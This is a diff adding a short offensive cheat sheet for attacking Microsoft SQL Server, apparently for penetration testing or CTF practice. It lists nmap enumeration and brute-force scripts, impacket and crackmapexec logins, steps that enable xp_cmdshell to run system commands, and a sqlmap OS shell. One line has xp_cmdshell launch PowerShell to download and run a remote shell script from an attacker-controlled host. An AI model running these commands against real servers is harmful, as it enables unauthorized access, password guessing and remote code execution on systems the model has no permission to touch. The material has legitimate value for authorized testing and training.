@@ -1,0 +1,21 @@
+MSSQL
+Nmap Scripts
+bashnmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess -p 1433 target
+nmap --script ms-sql-brute -p 1433 target
+Tools
+bash# impacket
+impacket-mssqlclient user:pass@target
+impacket-mssqlclient user:pass@target -windows-auth
+
+# Inside mssqlclient:
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://yourip/shell.ps1')"
+
+# crackmapexec
+crackmapexec mssql target -u user -p pass
+crackmapexec mssql target -u user -p pass -x "whoami"
+
+# SQLMap against MSSQL
+sqlmap -d "mssql://user:pass@target:1433/master" --os-shell
+
